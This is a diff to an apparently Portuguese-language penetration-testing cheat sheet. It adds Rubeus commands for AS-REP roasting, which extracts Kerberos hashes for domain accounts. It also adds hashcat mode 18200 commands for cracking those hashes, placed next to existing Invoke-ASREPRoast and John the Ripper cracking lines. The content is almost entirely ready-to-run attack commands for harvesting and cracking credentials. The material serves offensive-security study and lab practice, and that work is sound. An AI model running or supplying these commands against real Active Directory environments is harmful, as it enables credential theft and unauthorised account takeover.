@@ -429,20 +429,26 @@ Invoke-ASREPRoast -Verbose | Out-String -Width 4096
 ```
 ##### KERBEROASTING-ASREP - OBTER O HASH DE USUARIOS USANDO RUBEUS
 ```
-aaa
+Rubeus.exe asreproast /nowrap
+Rubeus.exe asreproast /user:test3 /nowrap
+Rubeus.exe asreproast /user:test3 /nowrap /simple
+Rubeus.exe asreproast /user:test3 /nowrap /simple /outfile:hash.txt
+Rubeus.exe asreproast /user:test3 /format:hashcat /nowrap
 ```
 ##### KERBEROASTING-ASREP - CRACK PASSWORD
-```
-xxx
-```
 ```
 john hashes.txt --wordlist=wordlist.txt
 john --format=krb5asrep hashes.txt --wordlist=wordlist.txt
 john --show hashes.txt
 rm  /root/.john/john.pot
 ```
-
-
+HASHCAT - TIPO23 (17 ou 19)
+```
+hashcat -m 18200 -a 0 hashes.txt wordlist.txt
+hashcat -m 18200 -a 0 hashes.txt wordlist.txt -o quebradas.txt
+hashcat -m 18200 -a 0 hashes.txt wordlist.txt --show
+hashcat -m 18200 -a 0 hashes.txt wordlist.txt --potfile-disable
+```
 # POWERSHELL
 ## DOWNLOAD
 ##### POWERSHELL - DOWNLOAD AS STRING
